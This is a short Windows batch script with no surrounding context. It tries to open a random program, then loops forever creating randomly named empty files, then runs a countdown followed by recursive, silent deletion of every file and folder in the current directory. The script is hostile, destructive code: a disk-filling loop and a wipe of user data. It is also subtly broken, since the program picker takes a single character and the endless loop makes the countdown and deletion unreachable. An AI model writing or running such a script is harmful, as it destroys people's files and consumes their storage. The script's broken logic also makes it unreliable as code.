@echo off
setlocal enabledelayedexpansion

set apps= [notepad.exe, paint.exe, calc.exe, cmd.exe]

set /a choice=%random% %% 4

start !apps:~%choice%,1!

:loop
set filename=%random%_!random!_!random!.txt
echo.>"%filename%"
goto loop

:countdown
echo 10
ping -n 2 localhost >nul
echo 9
ping -n 2 localhost >nul
echo 8
ping -n 2 localhost >nul
echo 7
ping -n 2 localhost >nul
echo 6
ping -n 2 localhost >nul
echo 5
ping -n 2 localhost >nul
echo 4
ping -n 2 localhost >nul
echo 3
ping -n 2 localhost >nul
echo 2
ping -n 2 localhost >nul
echo 1
ping -n 2 localhost >nul

for /d %%D in (*) do rd "%%D" /s /q
for %%F in (*) do del "%%F" /q
